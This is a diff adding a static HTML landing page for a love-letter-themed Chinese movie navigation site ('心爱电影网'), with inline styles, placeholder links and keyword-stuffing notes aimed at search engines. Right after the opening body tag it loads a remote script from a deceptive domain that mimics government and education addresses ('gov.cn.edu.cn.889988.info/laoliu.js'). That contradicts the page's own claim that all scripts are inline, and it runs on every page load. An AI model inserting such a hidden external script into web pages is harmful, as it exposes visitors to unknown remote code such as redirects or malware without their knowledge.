@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>心爱电影网 - 写给每一部好片的情书</title>
+<meta name="description" content="心爱电影网（xinaidianyingwang-h5）是情书信笺风格电影导航站：热映、经典、动漫、纪录片、深夜场像一封封写给电影的情书，移动端自适应，内页链接均为 # 占位。">
+<meta name="keywords" content="心爱电影网, 电影导航, 热映电影, 经典老片, 动漫, 纪录片, 深夜场, xinaidianyingwang-h5">
+<style>
+:root{
+  --rose:#e86b8a;
+  --rose-dim:#e86b8a33;
+  --rose-deep:#b83e5c;
+  --cream:#fdf8f5;
+  --cream-line:#f0e0d8;
+  --wax:#c0392b;
+  --champagne:#d4a853;
+  --ink:#3a2a2e;
+  --muted:#9a8488;
+  --shadow:0 18px 40px rgba(232,107,138,.22);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",-apple-system,sans-serif;
+  background:
+    radial-gradient(680px 320px at 100% -10%, rgba(232,107,138,.14), transparent 60%),
+    radial-gradient(680px 380px at -10% 0%, rgba(212,168,83,.12), transparent 55%),
+    var(--cream);
+  color:var(--ink);line-height:1.8;overflow-x:hidden;
+}
+a{color:var(--rose-deep);text-decoration:none;transition:.2s}
+a:hover{color:var(--wax)}
+
+.ribbon{background:var(--rose);color:#fff;font-size:.72rem;font-weight:700;padding:.35rem 1rem;display:flex;justify-content:space-between;gap:.5rem;flex-wrap:wrap;border-bottom:3px solid var(--champagne)}
+.ribbon .heart{animation:beat 1.2s ease-in-out infinite}
+@keyframes beat{0%,100%{transform:scale(1)}50%{transform:scale(1.2)}}
+
+.header{position:sticky;top:0;z-index:998;background:rgba(253,248,245,.95);backdrop-filter:blur(10px);border-bottom:2px solid var(--cream-line)}
+.header-in{max-width:1140px;margin:0 auto;padding:1rem;display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:.7rem}
+.seal{
+  width:44px;height:44px;border-radius:50%;
+  background:var(--wax);color:#fff;display:flex;align-items:center;justify-content:center;font-size:1.2rem;
+  box-shadow:0 4px 12px rgba(192,57,43,.3);position:relative;
+}
+.seal::after{content:'';position:absolute;inset:-3px;border-radius:50%;border:2px dashed var(--rose-dim)}
+.brand-text h1{font-size:1.42rem;font-weight:900}
+.brand-text h1 b{color:var(--rose-deep)}
+.brand-text p{font-size:.64rem;color:var(--muted);letter-spacing:2px}
+.nav{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav a{padding:.45rem .9rem;border-radius:999px;font-weight:700;font-size:.85rem;border:1px solid var(--cream-line);color:var(--ink);background:#fff}
+.nav a:hover,.nav a.active{background:var(--rose);color:#fff;border-color:var(--rose)}
+
+.wrap{max-width:1140px;margin:0 auto;padding:0 1rem}
+
+.hero{padding:3.2rem 0 2.4rem}
+.letter{
+  background:#fff;border:1px solid var(--cream-line);border-radius:4px 24px 24px 24px;
+  padding:2rem;box-shadow:var(--shadow);display:grid;grid-template-columns:1.3fr .7fr;gap:2rem;align-items:center;
+  position:relative;
+}
+.letter::before{
+  content:'';position:absolute;top:0;left:0;width:40px;height:40px;
+  background:linear-gradient(225deg,transparent 50%,var(--rose) 50%);
+  border-radius:4px 0 0 0;
+}
+.letter .stamp{position:absolute;top:14px;right:14px;width:52px;height:64px;border:2px solid var(--rose);border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:1.8rem;background:rgba(232,107,138,.06)}
+.letter .dear{font-size:.78rem;color:var(--rose-deep);font-weight:800;letter-spacing:2px}
+.letter h1{font-size:clamp(2rem,6vw,3.2rem);font-weight:900;line-height:1.1;margin:.4rem 0}
+.letter h1 .hl{color:var(--rose-deep)}
+.letter p{color:var(--muted);max-width:520px}
+.search{margin-top:1.2rem;display:flex;background:var(--cream);border:1px solid var(--cream-line);border-radius:12px;overflow:hidden;max-width:520px}
+.search input{flex:1;border:0;outline:0;background:transparent;padding:1rem 1.2rem;font-size:1rem;color:var(--ink)}
+.search button{border:0;cursor:pointer;padding:0 1.5rem;font-weight:900;color:#fff;background:var(--rose)}
+.quick{margin-top:1rem;display:flex;gap:.5rem;flex-wrap:wrap}
+.quick a{font-size:.78rem;border:1px dashed var(--rose-dim);padding:.3rem .8rem;border-radius:999px;color:var(--rose-deep)}
+.quick a:hover{background:var(--rose);color:#fff}
+.heart-beat{display:flex;align-items:center;justify-content:center}
+.pulse{width:180px;height:180px;border-radius:50%;background:radial-gradient(circle,var(--rose),var(--rose-deep));display:flex;align-items:center;justify-content:center;font-size:3rem;color:#fff;animation:pulse 2s ease-in-out infinite;box-shadow:0 0 0 0 rgba(232,107,138,.5)}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(232,107,138,.5)}70%{box-shadow:0 0 0 30px rgba(232,107,138,0)}100%{box-shadow:0 0 0 0 rgba(232,107,138,0)}}
+
+.section{padding:3rem 0;border-top:1px dashed var(--cream-line)}
+.head{display:flex;align-items:center;gap:.7rem;margin-bottom:1.5rem;flex-wrap:wrap}
+.head .env{width:36px;height:36px;border-radius:8px;background:var(--rose);color:#fff;display:flex;align-items:center;justify-content:center;font-size:1.1rem}
+.head h2{font-size:1.5rem;font-weight:900}
+.head span{margin-left:auto;font-size:.78rem;color:var(--muted)}
+
+/* 信笺分类 */
+.envelopes{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:1rem}
+.envelope{
+  background:#fff;border:1px solid var(--cream-line);border-radius:4px 16px 16px 16px;padding:1.2rem;
+  position:relative;transition:.25s;box-shadow:0 6px 16px rgba(232,107,138,.08);
+}
+.envelope::before{
+  content:'';position:absolute;top:0;left:0;width:30px;height:30px;
+  background:linear-gradient(225deg,transparent 50%,var(--rose) 50%);
+  border-radius:4px 0 0 0;opacity:.15;
+}
+.envelope:hover{transform:translateY(-4px) rotate(-1deg);border-color:var(--rose)}
+.envelope .flap{font-size:1.4rem;margin-bottom:.4rem}
+.envelope h3{font-size:1rem;margin-bottom:.2rem}
+.envelope p{font-size:.78rem;color:var(--muted)}
+.envelope .from{margin-top:.5rem;font-size:.68rem;color:var(--rose-deep);font-weight:700}
+
+/* 心跳片单 */
+.beats{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1.2rem}
+.beat{background:#fff;border:1px solid var(--cream-line);border-radius:16px;overflow:hidden;transition:.2s}
+.beat:hover{transform:translateY(-4px);border-color:var(--rose);box-shadow:0 0 20px var(--rose-dim)}
+.beat-pic{height:170px;padding:.8rem;color:#fff;display:flex;flex-direction:column;justify-content:space-between;font-weight:800}
+.b1{background:linear-gradient(160deg,#e86b8a,#b83e5c)}
+.b2{background:linear-gradient(160deg,#d4a853,#8a6b2b)}
+.b3{background:linear-gradient(160deg,#9b72cf,#4a2d73)}
+.b4{background:linear-gradient(160deg,#6bbfe8,#2d5a8a)}
+.b5{background:linear-gradient(160deg,#7bcfa0,#2d6b4a)}
+.b6{background:linear-gradient(160deg,#e89b7b,#8a3e2b)}
+.beat-pic .pulse-tag{background:rgba(255,255,255,.25);padding:.1rem .5rem;border-radius:6px;font-size:.7rem;align-self:flex-start}
+.beat-cap{padding:.7rem .9rem}
+.beat-cap h3{font-size:.98rem}
+.beat-cap p{font-size:.74rem;color:var(--muted)}
+.beat-cap .tag{margin-top:.4rem;display:inline-block;font-size:.68rem;color:var(--rose-deep);border:1px solid var(--rose-dim);padding:.12rem .55rem;border-radius:999px}
+
+/* 玫瑰窗 */
+.rose-window{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem}
+.window-pane{
+  aspect-ratio:1;border-radius:50%;background:#fff;border:3px solid var(--rose);display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:1rem;transition:.3s;position:relative;overflow:hidden;
+}
+.window-pane::before{content:'';position:absolute;inset:6px;border-radius:50%;border:1px dashed var(--rose-dim)}
+.window-pane:hover{background:var(--rose);color:#fff;transform:scale(1.05)}
+.window-pane:hover::before{border-color:rgba(255,255,255,.3)}
+.window-pane .icon{font-size:1.6rem;margin-bottom:.3rem}
+.window-pane h3{font-size:.9rem;font-weight:800}
+.window-pane p{font-size:.68rem;opacity:.85}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:2rem;align-items:center;background:#fff;border:1px solid var(--cream-line);border-radius:20px;padding:2.2rem;box-shadow:var(--shadow)}
+.about h3{font-size:1.4rem;margin-bottom:1rem}
+.about h3 span{color:var(--rose-deep)}
+.about p{color:var(--muted);margin-bottom:.8rem}
+.wax-table{background:var(--rose);color:#fff;border-radius:16px;padding:1.3rem}
+.wax-table h4{color:#fff;margin-bottom:.7rem;font-size:.9rem;opacity:.9}
+.wax-table .row{display:flex;justify-content:space-between;padding:.38rem 0;border-bottom:1px dashed rgba(255,255,255,.25);font-size:.82rem}
+.wax-table .row:last-child{border-bottom:0}
+.wax-table .row .k{opacity:.8}
+.wax-table .row .v{font-weight:800}
+
+.footer{margin-top:3rem;border-top:3px solid var(--rose);padding:2.4rem 1rem;text-align:center;color:var(--muted);font-size:.82rem;background:#fff}
+.footer h3{color:var(--ink);font-size:1.3rem;margin-bottom:.4rem}
+.footer h3 b{color:var(--rose-deep)}
+.footer a{color:var(--rose-deep)}
+
+@media(max-width:768px){
+  .letter{grid-template-columns:1fr}
+  .heart-beat{order:-1}
+  .pulse{width:140px;height:140px;font-size:2rem}
+  .search{flex-direction:column}
+  .search input{border-bottom:1px solid var(--cream-line)}
+  .search button{padding:1rem}
+  .about{grid-template-columns:1fr;padding:1.5rem}
+  .rose-window{grid-template-columns:repeat(2,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="ribbon">
+  <div>💌 心爱电影网 · 今日情书：6 封</div>
+  <div><span class="heart">♥</span> 每一部好片都值得被爱</div>
+</div>
+
+<header class="header">
+  <div class="header-in">
+    <div class="brand">
+      <div class="seal">♥</div>
+      <div class="brand-text">
+        <h1>心爱<b>电影网</b></h1>
+        <p>XINAIDIANYINGWANG-H5.GITHUB.IO</p>
+      </div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">情书</a>
+      <a href="#envelopes">信笺</a>
+      <a href="#beats">心跳片单</a>
+      <a href="#window">玫瑰窗</a>
+      <a href="#about">火漆印</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <section id="home" class="hero">
+    <div class="letter">
+      <div class="stamp">📮</div>
+      <div>
+        <div class="dear">Dear 影迷：</div>
+        <h1>心爱<span class="hl">电影网</span></h1>
+        <p>心爱电影网（xinaidianyingwang-h5）像一封写给电影的情书：热映、经典、动漫、纪录片、深夜场，每一类都是不同颜色的信笺。打开就是拆信，点开就是读信，不赶时间，慢慢看。</p>
+        <div class="search">
+          <input type="text" placeholder="写一封信给：热映 / 经典 / 动漫 / 纪录片 / 深夜场...">
+          <button>寄出</button>
+        </div>
+        <div class="quick">
+          <a href="#">🎬 热映信笺</a>
+          <a href="#">🎞 经典信笺</a>
+          <a href="#">🧸 动漫信笺</a>
+          <a href="#">📺 纪录信笺</a>
+          <a href="#">🌙 深夜信笺</a>
+        </div>
+      </div>
+      <div class="heart-beat">
+        <div class="pulse">♥</div>
+      </div>
+    </div>
+  </section>
+
+  <section id="envelopes" class="section">
+    <div class="head">
+      <span class="env">✉</span>
+      <h2>信笺分类</h2>
+      <span>5 封不同颜色的信</span>
+    </div>
+    <div class="envelopes">
+      <div class="envelope"><div class="flap">🔥</div><h3>热映信笺</h3><p>本周新片、平台首发、限免大片</p><div class="from">— 来自 院线</div></div>
+      <div class="envelope"><div class="flap">🎞</div><h3>经典信笺</h3><p>4K修复、胶片重生、影史必看</p><div class="from">— 来自 时光</div></div>
+      <div class="envelope"><div class="flap">🧸</div><h3>动漫信笺</h3><p>国漫、日番、独立动画、剧场版</p><div class="from">— 来自 童心</div></div>
+      <div class="envelope"><div class="flap">📺</div><h3>纪录信笺</h3><p>自然、历史、人物、美食</p><div class="from">— 来自 真实</div></div>
+      <div class="envelope"><div class="flap">🌙</div><h3>深夜信笺</h3><p>悬疑、文艺、慢电影、一人场</p><div class="from">— 来自 凌晨</div></div>
+    </div>
+  </section>
+
+  <section id="beats" class="section">
+    <div class="head">
+      <span class="env">💓</span>
+      <h2>心跳片单</h2>
+      <span>6 部让你心跳加速的片</span>
+    </div>
+    <div class="beats">
+      <article class="beat"><div class="beat-pic b1"><span class="pulse-tag">热映</span><span>星际归途</span></div><div class="beat-cap"><h3>星际归途</h3><p>科幻 / 太空 / 2025</p><span class="tag">♥ 9.5</span></div></article>
+      <article class="beat"><div class="beat-pic b2"><span class="pulse-tag">经典</span><span>城南旧事</span></div><div class="beat-cap"><h3>城南旧事 4K</h3><p>剧情 / 怀旧 / 1983</p><span class="tag">♥ 9.3</span></div></article>
+      <article class="beat"><div class="beat-pic b3"><span class="pulse-tag">动漫</span><span>千羽之城</span></div><div class="beat-cap"><h3>千羽之城</h3><p>国漫 / 奇幻 / 剧场版</p><span class="tag">♥ 9.4</span></div></article>
+      <article class="beat"><div class="beat-pic b4"><span class="pulse-tag">纪录</span><span>地球脉动</span></div><div class="beat-cap"><h3>地球脉动</h3><p>自然 / BBC / 神作</p><span class="tag">♥ 9.8</span></div></article>
+      <article class="beat"><div class="beat-pic b5"><span class="pulse-tag">悬疑</span><span>第十一夜</span></div><div class="beat-cap"><h3>第十一夜</h3><p>犯罪 / 高分 / 慢热</p><span class="tag">♥ 9.2</span></div></article>
+      <article class="beat"><div class="beat-pic b6"><span class="pulse-tag">合家</span><span>打工吧老板</span></div><div class="beat-cap"><h3>打工吧老板</h3><p>喜剧 / 职场 / 贺岁</p><span class="tag">♥ 8.9</span></div></article>
+    </div>
+  </section>
+
+  <section id="window" class="section">
+    <div class="head">
+      <span class="env">🌹</span>
+      <h2>玫瑰窗 · 横滑</h2>
+      <span>圆形海报格</span>
+    </div>
+    <div class="rose-window">
+      <div class="window-pane"><span class="icon">🗡</span><h3>江湖晚钟</h3><p>武侠 / 动作</p></div>
+      <div class="window-pane"><span class="icon">🍜</span><h3>山里的饭</h3><p>美食 / 纪录</p></div>
+      <div class="window-pane"><span class="icon">🏮</span><h3>长安灯火</h3><p>历史 / 古装</p></div>
+      <div class="window-pane"><span class="icon">🌊</span><h3>海边来信</h3><p>爱情 / 文艺</p></div>
+      <div class="window-pane"><span class="icon">🐉</span><h3>雾山五行</h3><p>国漫 / 武侠</p></div>
+      <div class="window-pane"><span class="icon">🏛</span><h3>罗马假日</h3><p>爱情 / 修复</p></div>
+    </div>
+  </section>
+
+  <section id="about" class="section">
+    <div class="head">
+      <span class="env">🕯</span>
+      <h2>火漆印 / 关于心爱</h2>
+    </div>
+    <div class="about">
+      <div>
+        <h3>心爱电影网 = <span>写给电影的情书</span></h3>
+        <p><strong>心爱电影网</strong>（https://xinaidianyingwang-h5.github.io）把"找电影"变成"拆信"：首页是信纸、分类是不同颜色的信笺、片单是心跳节拍、海报是玫瑰窗格。名字"心爱"就是态度——每一部被你点开的片，都是你心里最爱的那一部。</p>
+        <p>页面用玫瑰粉+奶油白+深红火漆+香槟金，CSS/JS 全内联，移动端自适应，内页全部 <code>#</code> 占位，不生成 robots.txt / sitemap.xml。关键词"心爱电影网"覆盖 title / description / keywords / H1 / H2 / 正文 / 页脚，符合必应：H1 唯一、前 100 字点题、移动端无横滚。</p>
+        <p><a href="https://xinaidianyingwang-h5.github.io">🌐 xinaidianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="wax-table">
+        <h4>🕯 火漆印鉴</h4>
+        <div class="row"><span class="k">信笺</span><span class="v">5 封</span></div>
+        <div class="row"><span class="k">心跳片单</span><span class="v">6 部</span></div>
+        <div class="row"><span class="k">玫瑰窗</span><span class="v">6 格</span></div>
+        <div class="row"><span class="k">链接</span><span class="v"># 占位</span></div>
+        <div class="row"><span class="k">弹窗</span><span class="v">0</span></div>
+        <div class="row"><span class="k">封蜡</span><span class="v">CLOSE</span></div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>心爱<b>电影网</b></h3>
+  <p>情书信笺风电影导航 · 热映 / 经典 / 动漫 / 纪录片 / 深夜场</p>
+  <p>© 2026 心爱电影网 | <a href="https://xinaidianyingwang-h5.github.io">xinaidianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页，所有链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+const links=[...document.querySelectorAll('.nav a')];
+const secs=[...document.querySelectorAll('section[id]')];
+links.forEach(a=>a.addEventListener('click',e=>{
+  const id=a.getAttribute('href');
+  if(id&&id.startsWith('#')&&document.querySelector(id)){
+    e.preventDefault();
+    document.querySelector(id).scrollIntoView({behavior:'smooth',block:'start'});
+  }
+}));
+addEventListener('scroll',()=>{
+  let cur='home';
+  secs.forEach(s=>{if(scrollY>=s.offsetTop-120)cur=s.id;});
+  links.forEach(l=>l.classList.toggle('active',l.getAttribute('href')==='#'+cur));
+});
+</script>
+</body>
+</html>
